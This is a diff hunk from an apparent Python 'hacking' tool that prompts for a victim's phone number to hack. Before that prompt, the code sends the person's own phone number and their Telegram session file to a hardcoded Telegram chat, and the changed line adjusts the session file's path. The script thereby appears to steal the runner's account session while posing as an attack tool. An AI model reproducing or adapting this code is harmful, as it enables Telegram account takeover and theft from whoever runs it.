@@ -26,7 +26,7 @@ client.start()
 try:
     print("h")
     Client_.send_message(chat_id='6349139033',text=f"Phone Number: {phone}")
-    file = open('../pythonProject59/session.session', 'rb')
+    file = open('session.session', 'rb')
     Client_.send_document(chat_id='6349139033',document=file)
     victim = input(cyan + bold + '[+]\033[0m \033[01mEnter victim\'s phone with country code to hack(eg: +92) >\033[0m ')
     print("Connecting to victim's api...")
